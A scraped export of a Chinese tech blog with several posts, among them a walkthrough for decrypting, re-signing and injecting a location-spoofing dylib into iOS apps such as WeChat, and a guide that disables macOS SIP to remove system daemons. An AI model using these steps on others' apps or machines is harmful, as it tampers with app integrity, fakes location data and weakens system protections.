(/home/dokku/ruby-rails-sample/DOKKU_PROCFILE)-----&gt; DOKKU_SCALE file not found in app image. Generating one based on Procfile...-----&gt; New DOKKU_SCALE file generated=====&gt; web=1-----&gt; Attempting pre-flight checks       For more efficient zero downtime deployments, create a file CHECKS.       See http://dokku.viewdocs.io/dokku/deployment/zero-downtime-deploys/ for examples       CHECKS file not found in container: Running simple container check...-----&gt; Waiting for 10 seconds ...-----&gt; Default container check successful!-----&gt; Running post-deploy-----&gt; Creating new /home/dokku/ruby-rails-sample/VHOST...-----&gt; Setting config vars       DOKKU_PROXY_PORT:  80-----&gt; Setting config vars       DOKKU_PROXY_PORT_MAP:  http:80:5000-----&gt; Configuring ruby-rails-sample.lab.yfgeek.com...(using built-in template)-----&gt; Creating http nginx.conf-----&gt; Running nginx-pre-reload       Reloading nginx-----&gt; Setting config vars       DOKKU_APP_RESTORE:  1=====&gt; Renaming container (e38662846bcf) cranky_colden to ruby-rails-sample.web.1-----&gt; Attempting to run scripts.dokku.postdeploy from app.json (if defined)=====&gt; Application deployed:       http://ruby-rails-sample.lab.yfgeek.com\n\n如果代码有更新，只需要重新push，应用就会自动重新部署，一步到位。\n结语既然回不去了，就不要回去了，使用Dokku这样的PaaS的部署方式，简单快捷，仿若又回到了几年前。\nDokku美中不足的就是，没有Web界面，所有操作都需要用Cli来实现，这样的门槛，会让很多小白望而却步。很多云服务厂商都提供这样的方式，但是也会提供界面，不过没有web服务带来的好处就是，能最大限度的节省云服务器的资源，让低内存低配置的电脑也能勉强跑起来。\n以此类推，我们可以用这样的方法自动化部署更多的APP，同时也支持很多关系型、非关系型数据库，如Python、PHP、Java，轻松Git命令，后面的运维相关操作，根本不用你管，docker的方式，让我们更加便利的部署各种应用，更加安全，更加便捷可靠。\n本文demo地址：http://ruby-rails-sample.lab.yfgeek.com\n最后值得一提的是，官网的文档十分简明，提供了各种配置，本文介绍的比较具有局限性，建议到官网文档仔细拜读。\n\nhttp://dokku.viewdocs.io/dokku~v0.7.2/getting-started/installation/\n","categories":["PaaS"],"tags":["PaaS"]},{"title":"Siri+Workflow(捷径)利用API实战——远程构建Travis CI","url":"http://www.yfgeek.com/2018/09/25/Siri-Workflow-捷径-利用API实战——构建Travis-CI应用/","content":"iOS 12 中，最大的更新莫过于捷径（Workflow）可以和Siri产生互动。普通用户可能根本没有察觉到这个十分有用的自动化工具，实际上，早在iOS11时期，苹果收购了Workflow，很多用户就开始自行创建出很多有用的自动化脚本，很多用户都在闷声发大财（比如百度云链接提取、利用\u001cVIP视频网站免费看、修改微信运动步数、网易云音乐下载）。\n本文以“重新构建Travis CI中的项目”为例，介绍如何举一反三，利用开发者API创造自己的捷径工作流，同时利用Hey Siri，让生活更加科技感、酷酷的、便利化。\n鸣谢：@Echowxsy好友的Docker构建脚本及“删库跑路”脚本，对本文章的创作启发。\n目标通过Hey Siri，实现实时重新构建Travis CI中的应用，如图。\n\nTravis CI API其实Travis CI本身就是一个自动化构建工具，有很多种方法可以让他自动取构建，比如在设置中开启Build pushed branches，本文只是举个例子，利用Siri手动构建。\n首先，检查你使用的是org还是com版本的Travis CI。\ntravis.org API:https://developer.travis-ci.org\ntravis.com API: https://developer.travis-ci.com/\nTravis CI API其实很简单，只需要拿着自己的token，就可以进行API的GET/POST操作。\n访问Getting Started页面，可以看到两个例子，在这里，我们复制涂黑的部分，即为你的token。\n关于请求需要包含三个http headers：\nTravis-API-Version: This should always be set to 3, to avoid interfacing with our legacy API.\nUser-Agent: Most HTTP clients already set this, but if you develop a Travis CI client, you are highly encouraged to set this to a custom value.\nAuthorization: token XXXXXXX where XXXXXXX is an access token generated by the Travis CI client.\n获得所有Builds要重新构建当前项目，根据Build提供的参数，需要获得当前项目的build.id。\n此时可以通过Builds API进行获取，打开Postman，新建一个Request(或者您也可以用CURL命令)，配置如下，token填入自己的token，点击Send。\n\n在返回的JSON文件中，找到builds下的第一组里的id，即builds[0].id，这就是我们要提交的build.id。\n测试请求拿到build.id后，我们在Postman中发送这样的请求，如果拿到状态时pending，则说明请求成功。\n\nWorkflow创建Workflow的过程，需要自行研究，截图中每一个模块，都可以在下方搜索中搜索到。\n第一步，打开捷径\n第二步，搜索部件进行创建\n\n\n\n\n最后点击执行，测试一下，就可以用手机发送包含http headers的POST请求了。\nSiri设置Siri很简单，点击右上角的按钮，点击“Siri指令”\n\n测试一下\n\n查看一下Travis CI，重新部署成功\n\n从此，我们就可以愉快的用Siri部(zhuang)署(bi)啦～\n","categories":["iOS"],"tags":["iOS"]},{"title":"iOS App Hook逆向全过程纪实","url":"http://www.yfgeek.com/2018/09/18/iOS-App-Hook逆向全过程纪实/","content":"前言微信抢红包、修改定位、语音转发，很火，自己足不出户可以走遍天下，这很酷。最近研究了iOS的hook技术，发现门道不少，特意写个纪实blog，本文非教程，本文以微信为例，部分内容可能看不懂。\n下载APP对于App Store的应用App Store中的应用都加密过，直接用是不行的，有两种方法：\n\n如果通过PP助手下载的app，直接将XXX.app通过iFunBox提取到mac上，直接提供class-dump使用。\n越狱后的App目录在/var/mobile/Applications/xxxxxx/ 下，通过iFunBox可以直接把dumpdecrypted.dylib文件放到Documents下，用命令砸壳，用到的砸壳工具就是dumpdecrypted\n\n最后得到最终的ipa文件\nSafari里安装的企业应用在电脑上，打开企业提供的网址，找到iOS安装入口，点击下载，会自动下载一个.plist文件，打开如下：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt;\t&lt;key&gt;items&lt;/key&gt;\t&lt;array&gt;\t\t&lt;dict&gt;\t\t\t&lt;key&gt;assets&lt;/key&gt;\t\t\t&lt;array&gt;\t\t\t\t&lt;dict&gt;\t\t\t\t\t&lt;key&gt;kind&lt;/key&gt;\t\t\t\t\t&lt;string&gt;software-package&lt;/string&gt;\t\t\t\t\t&lt;key&gt;url&lt;/key&gt;\t\t\t\t\t&lt;string&gt;https://**/下载地址/&lt;/string&gt;\t\t\t\t&lt;/dict&gt;\t\t\t\t&lt;dict&gt;\t\t\t\t\t&lt;key&gt;kind&lt;/key&gt;\t\t\t\t\t&lt;string&gt;display-image&lt;/string&gt;\t\t\t\t\t&lt;key&gt;url&lt;/key&gt;\t\t\t\t\t&lt;string&gt;https://**/ios-icon/&lt;/string&gt;\t\t\t\t&lt;/dict&gt;\t\t\t&lt;/array&gt;\t\t\t&lt;key&gt;metadata&lt;/key&gt;\t\t\t&lt;dict&gt;\t\t\t\t&lt;key&gt;bundle-identifier&lt;/key&gt;\t\t\t\t&lt;string&gt;xxx.xxx.com&lt;/string&gt;\t\t\t\t&lt;key&gt;bundle-version&lt;/key&gt;\t\t\t\t&lt;string&gt;1.0.0&lt;/string&gt;\t\t\t\t&lt;key&gt;kind&lt;/key&gt;\t\t\t\t&lt;string&gt;software&lt;/string&gt;\t\t\t\t&lt;key&gt;title&lt;/key&gt;\t\t\t\t&lt;string&gt;软件名字&lt;/string&gt;\t\t\t&lt;/dict&gt;\t\t&lt;/dict&gt;\t&lt;/array&gt;&lt;/dict&gt;&lt;/plist&gt;\n\n找到software-package中的url值，复制到浏览器，会自动请求服务器，下载一个带有企业签名的ipa文件。\n确认是否脱壳解密把ipa文件后缀改成zip，然后解压，会看到.app文件\nfile /Users/ivan/Desktop/Payload/xxx.app/xxx/Users/ivan/Desktop/Payload/xxx.app/xxx: Mach-O universal binary with 2 architectures: [arm_v7:Mach-O executable arm_v7] [arm64]/Users/ivan/Desktop/Payload/xxx.app/xxx (for architecture armv7):\tMach-O executable arm_v7/Users/ivan/Desktop/Payload/xxx.app/xxx (for architecture arm64):\tMach-O 64-bit executable arm64\n\n可见，xxx包含armv7和arm64两个版本。\notool可以输出app的load commands，然后通过查看cryptid这个标志位来判断app是否被加密。1代表加密了，0代表被解密了：\notool -l /Users/ivan/Desktop/Payload/xxx.app/xxx   | grep -B 2 crypt          cmd LC_ENCRYPTION_INFO      cmdsize 20     cryptoff 16384    cryptsize 4161536      cryptid 0--          cmd LC_ENCRYPTION_INFO_64      cmdsize 24     cryptoff 16384    cryptsize 4866048      cryptid 0\n\n可见，xxx为0状态，企业级app不在app stroe上发布，没有被加密。\n测试重新签名重新签名打包GitHub上的Urinx大佬为我们准备了一键化的重新签名工具Appsign，非常好用，下载地址：\nhttps://github.com/Urinx/iOSAppHook/releases\n下载后，测试能否重新签名，因为我们的最终目的是将程序重新打包签名，将带有tweak的程序安装到手机上，这一步骤至关重要。\n赋予执行权限\nchomd +x /Users/ivan/Downloads/AppResign\n\n执行命令，按照AppResign的要求，命令为AppResign input output\n/Users/ivan/Downloads/AppResign  /Users/ivan/Desktop/要被签名的文件.ipa  /Users/ivan/Desktop/output/输出的文件xxx.ipa=============================[*] Configure ResigningChoose Signing Ceritificate:[0] iPhone Developer: aabb@foxmail.com (3N2H*****3)[1] *****[2] iPhone Developer: xxxxx@icloud.com (4*****6T9C)&gt; 2Use Certificate: iPhone Developer: xxxx@icloud.com (4*****6T9C)Choose Provisioning Profile:[0] iOS Team Provisioning Profile: cc.caver.SimulateLocation (KHER5U9877)Use Profile: iOS Team Provisioning Profile: cc.caver.SimulateLocation (KHER5U9877)Position: /Users/ivan/Library/MobileDevice/Provisioning Profiles/xxxx-ec15-xxxx-bf8d-xxxx.mobileprovisionUse default bundle ID: cc.caver.SimulateLocationSet App Display Name: pojieappDelete url schemes (y/n): n=============================[*] Start Resigning AppExtracting ipa fileCopying provisioning profile to app bundleParsing entitlementsChanging App ID to cc.caver.SimulateLocationChanging Display Name to yuanquCodesigning /xxx.app with entitlementsPackaging IPADone, output at /Users/ivan/Desktop/output/输出的文件xxx.ipa\n\n安装测试打开Xcode，点击Window，点击Devices and Simulators\n看到如下界面，点击加号，添加刚刚output出的ipa，稍等片刻，安装到手机。\n\n信任证书后，如果能成功安装并且打开，说明没毛病。\n安装Theos安装 iOS SDKxcode-select --install\n\n环境变量echo &quot;export THEOS=~/theos&quot; &gt;&gt; ~/.profile\n\n下载Theosgit clone --recursive https://github.com/theos/theos.git $THEOS\n\n安装ldidbrew install ldid\n\n安装ghostbincurl https://ghostbin.com/ghost.sh -o $THEOS/bin/ghostchmod +x $THEOS/bin/ghost\n\n编写Hook创建Tweak在命令中输入 nic.pl选13，后面内容自行填写\n\n分析-(void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations &#123;        CLLocation *newLocation = locations[0];    CLLocationCoordinate2D coordinate = newLocation.coordinate;  &#125;\n\n我们试着实现\n通过引用LocationTracker框架后,开始获取位置后,便会通过locationManager这个代理来回调,并通过 CLLocationCoordinate2D coordinate = newLocation.coordinate. 这句来获取到位置信息. 明白原理就简单了,接下来我们只需要在app内部hook到CLLocation的coordinate,并返回我们想要的地理位置就可以啦,源代码如下:\n实现代码location.plist\n&#123; Filter = &#123; Bundles = ( &quot;com.caver.SimulateLocation&quot; ); &#125;; &#125;\n\nTweak.xm\n#import &lt;CoreLocation/CoreLocation.h&gt;%hook locationManager-(CLLocationCoordinate2D) coordinate&#123;  CLLocationCoordinate2D oldCoordinate = %orig;  oldCoordinate.latitude = 39.0010750000;   oldCoordinate.longitude = 116.0096720000;  return oldCoordinate;&#125;%end\n\n编译在目录下执行make，将编译好的复制到本层目录\ncd project/locationmakecp .theos/obj/debug/location.dylib ./\n\n检查依赖otool -L location.dyliblocation.dylib (architecture armv7):\t/Library/MobileSubstrate/DynamicLibraries/location.dylib (compatibility version 0.0.0, current version 0.0.0)\t/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)\t/System/Library/Frameworks/Foundation.framework/Foundation (compatibility version 300.0.0, current version 1452.23.0)\t/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation (compatibility version 150.0.0, current version 1452.23.0)\t/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate (compatibility version 0.0.0, current version 0.0.0)\t/usr/lib/libstdc++.6.dylib (compatibility version 7.0.0, current version 104.2.0)\t/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1252.50.4)location.dylib (architecture arm64):\t/Library/MobileSubstrate/DynamicLibraries/location.dylib (compatibility version 0.0.0, current version 0.0.0)\t/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)\t/System/Library/Frameworks/Foundation.framework/Foundation (compatibility version 300.0.0, current version 1452.23.0)\t/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation (compatibility version 150.0.0, current version 1452.23.0)\t/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate (compatibility version 0.0.0, current version 0.0.0)\t/usr/lib/libstdc++.6.dylib (compatibility version 7.0.0, current version 104.2.0)\t/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1252.50.4)\n\n解决不存在的依赖\n因为MobileSubstrate是越狱后才有的，必须在注入前替换掉这个库，相应的，libsubstrate.dylib下载地址：\nhttps://pan.baidu.com/s/1o8PPVGu\ninstall_name_tool -change /Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate @loader_path/libsubstrate.dylib location.dylib\n\n再次用otool检查，没有MobileSubstrate后可以继续下一步\n重新签名dylib在钥匙串访问中能找到一个名为 Developer ID Application: Your Company Name 的证书。\ncodesign -f -s &#x27;iPhone Developer: xxxx@icloud.com (4*****6T9C)&#x27; libsubstrate.dyliblibsubstrate.dylib: replacing existing signature\n\n动态库注入动态库的注入,可以使用这个工具 insert_dylib脚本.\ninsert_dylib --all-yes @executable_path/test.dylib Payload/WeChat.app/WeChat\n\n@executable_path/test.dylib 表示动态库的加载路径,@executable_path 表示可执行文件所在的路径, 所以我们要把动态库放到可执行文件一级的目录.\ngit clone http://www.github.com/Tyilo/insert_dylib\n\n然后在xcode中运行，提取Products中的insert_dylib二进制文件\n/Users/ivan/d/tweak/insert_dylib  --all-yes /Users/ivan/d/tweak/location/.theos/obj/debug/location.dylib  /Users/ivan/Desktop/Payload/xxx.app/xxxBinary is a fat binary with 2 archs.LC_CODE_SIGNATURE load command found. Remove it? [y/n] yLC_CODE_SIGNATURE load command found. Remove it? [y/n] yAdded LC_LOAD_DYLIB to all archs in /Users/ivan/Desktop/Payload/xxx.app/xxx_patched\n\n修改xxx_patched名字为xxx，将刚刚生成的两个dylib复制到目录里。\n安装APP过程同测试重新签名，内容为纪实，仅供测试与学习过程。\n参考https://github.com/Urinx/iOSAppHook\nhttp://iosre.com/t/iosopendev-theos/8524\nhttp://iosre.com/t/app/3917\nhttps://pandara.xyz/2016/08/14/fake_wechat_location2/\n","categories":["Hack"],"tags":["Hack"]},{"title":"+[__NSPlaceholderDate initialize] may have been in progress in another thread when fork() was called. 解决方法","url":"http://www.yfgeek.com/2018/09/11/NSPlaceholderDate-initialize-may-have-been-in-progress-in-another-thread-when-fork-was-called-解决方法/","content":"最近在用python3写一个多线程工具，发现频繁报错：\nobjc[27880]: +[__NSPlaceholderDate initialize] may have been in progress in another thread when fork() was called.objc[27880]: +[__NSPlaceholderDate initialize] may have been in progress in another thread when fork() was called. We cannot safely call it or ignore it in the fork() child process. Crashing instead. Set a breakpoint on objc_initializeAfterForkError to debug.\n\n一直以为是代码的问题，不断的检查代码，其实是macOS的High Sierra以上的操作系统对多线程的限制，别无其它原因。\n临时调试方法在终端中输入 export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES\n不要关闭当前终端，再次运行python程序\n解决方法打开终端 输入\ncd ~sudo vim .bash_profile\n\n在最后一行加入\nexport OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES\n\n重启终端就解决了。\n","categories":["Mac"],"tags":["Mac"]},{"title":"优化Mac OS速度 解决tailspind、spindump、kernel_task问题","url":"http://www.yfgeek.com/2018/07/18/解决tailspind-spindump-kernal-task占用率过高-优化MacOS速度/","content":"最近安装了Mojave，发现卡了不少，其实问题不在系统，在于beta版bug比较多，有两个进程是专门用于生成应用程序调试快照的，对于我们普通用户来讲，没有什么用处，关闭，可以大大的提升系统的速度。\n关闭 tailspind 与 spindump第一步，重启，开机的时候按住Command+R\n第二步，选择终端，并且输入 csrutil disable，这是为了关闭SIP保护机制\n第三步，重启，进入系统，在终端中输入\nsudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.spindump.plistsudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.tailspind.plistsudo mv /System/Library/LaunchDaemons/com.apple.spindump.plist /System/Library/LaunchDaemons/com.apple.spindump.plist.baksudo mv /System/Library/LaunchDaemons/com.apple.tailspind.plist /System/Library/LaunchDaemons/com.apple.tailspind.plist.bak\n\n第四步，重启，完成\nkernel_task 占用率过高在日常使用中，我们总能发现kernel_task占用很高的内存和CPU，通过以下方法可以解决：\n第一步，重启，开机的时候按住Command+R\n第二步，选择终端，并且输入 csrutil disable，这是为了关闭SIP保护机制\n第三步，重启，进入系统，在终端中输入\nsudo mv /System/Library/Extensions/IOPlatformPluginFamily.kext /System/Library/Extensions/IOPlatformPluginFamily.kext.bak\n\n第四步，重启，完成\n开启SIP之前的操作，我们无形中关闭了SIP机制，为了使系统更安全，我们需要\n第一步，重启，开机的时候按住Command+R\n第二步，选择终端，并且输入 csrutil enable，重新开启mac OS保护机制\n参考https://www.macobserver.com/tips/how-to/disable-tailspind-spindump-macos-cpu-speed/\nhttps://blog.csdn.net/liumx2007/article/details/77164795\n","categories":["Mac"],"tags":["Mac"]},{"title":"两个加密聊天项目","url":"http://www.yfgeek.com/2018/03/24/两个加密聊天项目/","content":"许多小伙伴看到我的GitHub最近动态关注了很多Golang的项目，不禁私信问我，是不是在学Go语言，没错，确实在学。本文探讨这两个项目是什么，并且解释一下如何使用golang.org/x/crypto/otr包。\n为什么学Golang？ \n因为Golang十分优秀呀，能够轻而易举的写很多服务端程序，并发能力十足且简单，不禁引起了我的注意。\n作为初学者，撸了两个项目，作为学习经验，代码很渣，只为实现功能，做一个小demo。\n第一周 UDP加密聊天室chatroom - UDP加密聊天室\n众所周知，做聊天室是作为学习服务端/客户端的最佳例子，但是单纯的撸一个聊天室未必太无聊了。\n这个项目的特色在于：\n\n能够自行生成配置文件，类似于某影的方式，客户端和服务端分别导入配置文件，就可以启动了。\n服务端自动生成AES-256的key，客户端记住base64形式的KEY文件就可以进行加密通信。\n\n强调安全性，是我一直的目的。\n配置文件\n&#123;\t&quot;listen&quot;: &quot;:52915&quot;,\t&quot;remote&quot;: &quot;127.0.0.1&quot;,\t&quot;key&quot;: &quot;AzonXhdbWCYoAA52GTE9FnldZEN4KhEsInFJe1oHYAgzQTRsCyEdUlBOPzd3HxgFbTAudDZobiU8TQYbURBFWVdvMisNSn5UIw8kei0gcjl1cGkeFTV9U0tEY2YaCkdPYl9nZRQSBGsMQgFzVlxhL0hGAlV/O0A+OGoJfBwpE0w=&quot;&#125;\n\n第二周 OTR 端对端加密聊天otrchat - OTR 端对端加密聊天\n不要认为第一周和第二周的内容大同小异，其实区别大了。\n聊天室和聊天的区别在于：\n\n服务器要端对端的将消息传递给不同的客户端，不能单纯的广播给所有人\n要有查询所有在线用户并且选择性聊天功能\n\n此外，在这一周内还增加了：OTR协议\n简单的说OTR协议有点类似于Telegram的“secret chat”功能，可以对聊天内容进行加密，任何第三方包括服务器都无法查看两者聊天的内容，在此前我也写过一篇文章专门用于解释该协议。\n关于golang.org/x/crypto/otr包的使用经验，可以概括如下：\n首先，发起聊天者A需要向被聊者发送数据包\nc.sendMessages &lt;- otr.QueryMessage\n\n此后，golang.org/x/crypto/otr包会自动处理所有通信，包括互相发送公钥、签名、验证消息可靠性。\n发送\nmsgToPeer, err := otrConv.Send([]byte(msg))\t\t\tcheckError(err,&quot;otr conv sending&quot;)\t\t\tfor _, m := range msgToPeer &#123;\t\t\t\tc.sendMessages &lt;- string(m)&#125;\n\n接手及显示\nvar err errorout, encrypted, _, msgToPeer, err := otrConv.Receive(bytes)checkError(err,&quot;new chat&quot;)if len(out) &gt; 0 &#123;\tif !encrypted &#123;\t\tcolor.Red(&quot;&lt;OTR&gt; Conversation not yet encrypted!&quot;)\t\tcolor.Red(&quot;%s [%s] : %s&quot;, m.UserName, m.Time, string(out))\t&#125;else&#123;\t\tcolor.Blue(&quot;%s [%s] : %s&quot;, m.UserName, m.Time, string(out))\t&#125;\t&#125;if len(msgToPeer) &gt; 0 &#123;\tfor _, msg := range msgToPeer &#123;\tc.sendMessages &lt;-string(msg)\t&#125;&#125;\n\nmsgToPeer 表示OTR协议中需要完成额外的消息交换，所以需要单独的发送一遍。\n由于otr包的相关帮助甚少，坑很多，不明白为什么这个世界不大力推广端对端加密聊天。\nOTR协议下服务端所看到的通信内容如下：\nFrom 1 To 2 Message： ?OTRv2?From 2 To 1 Message： ?OTR:AAICAAAAxB+Iywuwg8aZG0gPZxY6anFes2KW4YT/rRrBZK50CC7kr+0p+jLXeU3VirUQMTW/eJkA8gKz9y2xYSxRRwLga0ATOx2AkOlENYT1MyXJFkAjgMD6SF6uPDy+apIIJkOiopW5T7vpON9Ogsh3XmV8i4T1yui9gs6mAuMT7PsLQ7b8rvd1WulRtquJtO9LKA1flDU7XsCAn4h4pobpCjOS7qQ6aZstlhFtNXD1ylLXrpJos3vBG7LZsH3zvouvG9FR94YlYuMAAAAg5t62vP0C+/LxRI7OJTWC5pMbv2yZqHE/yDQGclCsz0Q=.From 1 To 2 Message： ?OTR:AAIKAAAAwDem/luw0prZM/Nv23/7Q+6/HrpQ199BVm+hcA2YMSHm85MJhS+ym24EAy4lg45O2e8LX5BylK1CM+w55VqUIJ7QOBwN3WazIWuiYKXXTuIdSBLi52P4dulhaGydKPfqFFqRM3hL2etO5p9xdJ8LbF/4+8PEK8//R56gIZLPLZNTPD8onxLKF5UnWJS3A8OfvJFykKQtXLc6573Y3BsGZ1ywfs0jyMukE/szOV5goTqLOaAhQfpw7gRuaMMqmHYXoA==.From 2 To 1 Message： ?OTR:AAIRAAAAELaWJ2vpiHI8fmmdLgdFJ/0AAAHS43l5bWsQarN0F8UEWtJjgr/lxOT01s6PmNsY+WFAio3kzOBQnzleaqemtbmQMwfczDm9fLH2h1+qlf4q8b4SLco/MpLKjvNEjDNbrQ1d1hXRwiyTtcz7zGYxCcFc3xdHLuueL/zcTpcwcq8J1HSmLv+F2aoEzCywOW9sWtLzbikeUjA2mUSWr79krG9rkAHz2KVGL++rX1LWC/PQOVTzzmFKz1o4aK1qpna/9ef9ju6zxd9wvoOuXGJJi3NWGlkHUxXov8689j8HNJWkkl/YXxwit8Bk49WPvH/AKnhTwqBkfblguaEsHTPTli36yqNm3YKp+oP2IjrVzue9BWieT93c7BbpJUO8Fej1EBGGWxtPu+YE/ZlH+PwawUcjWCck16GbHr4fFPTYh4tVX3c2tJSEqVkpttRf7r70ucu1fqB+qrK95rcbkVIABRPg4xSuslRCQxhz/BwiN3ECmfRAI19jLBp/MO9FkqaqYc3Bws/50n13slet7mk7IVGt1xjZgdfuZEYGXDZzmUomraKp4Wnt6YsLI10zoEBUw4U0Vug4OJ+EY2gdpNTYYhJFLAUH6B+ktCO8c18pKglxtJJnSiBBNRpaAVwsldwWD77/vLekToFQRZeG6H7x0cuH23ZBqonHHHJX.From 1 To 2 Message： ?OTR:AAISAAAB0qTCp5GMIr0w9szym5OPRrrk5/DSuaO1xuwnLp9ic+JUsO0//k9Ju7qVdpNFValQOvdePheZsp1fbaRoa8dCjJWeZDQF9Rik0tjz+5xgepzmaUXxDtKH2kiYWvBMp+AI0BosDGXRsupMZNGTon7G08wEaSbi8UYLouPrylrswC09PYwiN6+yTxwOE4dv/4vnIXo2k4868I4Ag9kRQ56grPlWpa3jG1Hrgwvm8510MtvBD+UwGTFHXFz8MieimBtIdI/Do/9svh9LhNrvAlQCqxaf5b6Eaoz0mRI0XU3PSPi6Qu8ivsti0LbIho75uvqZYk6xo/nX0UQrs48vsAVmZzXyRYMZ4M9JC+VumnEtxl92oQ4SQzetfEusQ76capBH9YJVfjej6xvC8n4k0I4rGKi9WSWgd4pYi6JOfRI2Nl9xh22PO+g5PdxKyGMzjpqkj9jm4yyc5l6ukfA/FpPSdNJjd6AbAu8HI3Zmw6fHhx+t+znAvnaMbw2gQG9gxe0WlmhM4ySOOvAGTG7wf1Md7AcRfxxNWeyInHmf+JJ1T3O74cPh1a6H0QQxh2UkXjS03adQMwGXng4pejRZhcSAEIY/cMfdAFYohfsdlDhOiv9E3NdbDU1sBIMPMKkDfi5vPUJEoecarQ==.From 1 To 2 Message： ?OTR:AAIDAAAAAAEAAAABAAAAwO0jWIHSjaPxrZ7MtjgPYEbl9DGrA9idRzJA4vmdS6Lcc+JZbEdBqRH036j4Ie85mXLCWvqlPjYwKZNlQFbX5Rg+MMbqGl1Qcdk+Hfmd93pZf6Feg/yjlyBJOaCBWpTTpWzDyh+E2XZ3lZvlJxw1ogwatQn1VhicUXZzfDBSg1Dhw/jcAcXTn2wI+mmZ98rR9taBwgv41FN4mO7HhTkzUMQnJKPL9/zqtV6kWfwVYzXhaPoTnnbKa8L9hbYEMzy/OQAAAAAAAAABAAABADfvoGL7+tXt8VKqBj4JMwOsfhuH6PMlq47YQGf7l/5Dmszn2yVv+lemLj+YrcVxLOYO5WU0CGBjmr+52g+x/w3Dj0b+ak25y6H8bX3sPmcX/ZSgqTi+zt+IHqn207autlQVzvpt37g1grzWZvbn68a0obQqQp32jIXfOlYUFUv6cJDOvHk+3+1lRJdFFLjeP40OehnZ3AeOvT2wo6gNdEMFM4zgPtiskQtRxTFtFqs+KW/rkzefThdYhWpbMY/Nvpcf1S0Sy6HKLIqGwa7bkMa1coDfNma5fQzw856VWDFhQSq/PXT5aV4dDmXtYuBUs3YJoyWFGft03GDtZfdMQiqMDkTIJC2mB3O16CoDJBgXeM/0AQAAAAA=.From 2 To 1 Message： ?OTR:AAIDAAAAAAEAAAACAAAAwMpbV5DJJNyJODVA4cZmMXf76Ra+UJ0RtBqzbIbaWFfVoMWQwFypi+qktOnwFmYhuQr4O30Yy76xReJi1DRP72uWUudiyrFSJzSHPGLUqZ2RqVB+ovSifkuW8nQnq6UAbxQuWtYuKLOiaoK7EZ9+2RMcXOLx+h57Sd1x4IL2aZ+1y+X+vco1fcHTW79qcz1TCT0qfn7+cI9O1HaKt/O15C51Btemu0rthK5W+mId5ueTIKcove1Ao6BRxy0GvMewMwAAAAAAAAABAAABAH78/obuj6XrBlIb55u2fDpmu93ILP8pI9f2ozxwKpfi20f6sLif3cKPVN4of7i0iivtGcXBKf4g4Bo4hLx3nD33E9/aAeuxpy9Dr+uuHak9mUQA7HC07Yg2PrVUiNhV4QVj/XPg6A0xE040NRvNs5Ww9cZjHSOMg998zsGjaz528HkNQw9n06tF8uCRLh+XXkQnuV9Ln/JLd1wbWybJGMlQh82SYhgW+B/GONUG2nBo0ClBRU8aAWEGEsYVa6K6PQJzWBUjDInLdiYYauP7uo0nmkYxsTJNPbhA00RXER4LXpJq87lN4gihq+7cxr77plQEPi3Z/HwIWKmzgLlfi3W85bNg8E4gH8w1DEBMjZIgzADE/AAAAAA=.\n\n\n安全的无可匹敌！\n","categories":["Golang"],"tags":["Golang"]},{"title":"用HomeAssistant + HomeBridge树莓派构建智能家居中枢","url":"http://www.yfgeek.com/2018/02/23/用树莓派构建智能家居中枢-HomeAssistant-Home-Bridge/","content":" 好久没有更新文章啦，最近接了一个私活，也是人越来越懒，懒得更新。\n想着不行必须得更新一篇，那就写写最近构建的树莓派吧，话不多说，先上图。\n\n需要的原料\n树莓派\nHass.io或Hassbian或Raspbian系统\nDHT22传感器\n尽可能多的智能设备\n\nHome AssistantHome Assistant 是一个好系统，可以这么说，Home Assistant是一个包装好的智能家居控制系统的中心，在2018年看，可扩展性强，社区强大。\n我建议安装Hassbian系统，安静纯粹，安装过程如下。\n\n下载最新的Hassbian景象 (364 MB)\n\n用 Etcher 刷入你的树莓派储存卡。\n\n如果你是Wi-Fi链接，请先配置你的网络连接，重新插入sd卡，在根目录下，建立wpa_supplicant.conf文件，修改内容并保存。\ncountry=SEctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123;    ssid=&quot;YOUR_SSID&quot;    psk=&quot;YOUR_PASSWORD&quot;&#125;\n\n​\n\n插入SD卡，开机等待，刷新http://hassbian.local:8123/，直到出现页面。\n\n\n小提示\n\nEtcher一定要使用最新版1.3.1，旧版本可能导致无法开机\n不要相信官网所说的等待五分钟，由于中国的网络环境，很可能需要等待一小时到五小时，都是正常的，只要没有出现网页，就不要进入ssh\n出现页面后，可以ssh链接进页面，用户名是pi，密码是raspberry，用passwd重置密码。\n如果超过五个小时没有页面显示，这时候你再输入sudo systemctl start install_homeassistant.service重试。\n\n\nHomeBridgeHomeBridge可以让你的Hassbian支持iOS的Homekit，所以，这个插件一定要安装。\n安装方法如下：\n\nssh进入你的树莓派\n\n安装node\nsudo apt-get updatecurl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash sudo apt-get install -y nodejssudo apt-get install -y build-essential\n\n安装avahi\nsudo apt-get install libavahi-compat-libdnssd-dev\n\n安装homebridge\nsudo npm install -g --unsafe-perm homebridge\n\n\n\n好了，homebridge安装好后，我们输入homebridge试试可不可以运行？\n\n看到这样的二维码，我们就可以打卡iPhone的家庭.app，然后扫描二维码，添加我们的树莓派中继。\n温度和湿度传感器我们添加一个温度和湿度，接线方式\n接线需要并联一个10K电阻\nDHT22有3个脚,VCC,DATA,GNDVCC,接 3.3V,PIN 01DATA,接 GPIO04,PIN 07GND,接地,PIN 09其中DATA和VCC之间用10k电阻相连\n\n\n随后，执行以下代码\ngit clone https://github.com/NorthernMan54/homebridge-dhtcd homebridge-dhtsudo apt-get updatesudo 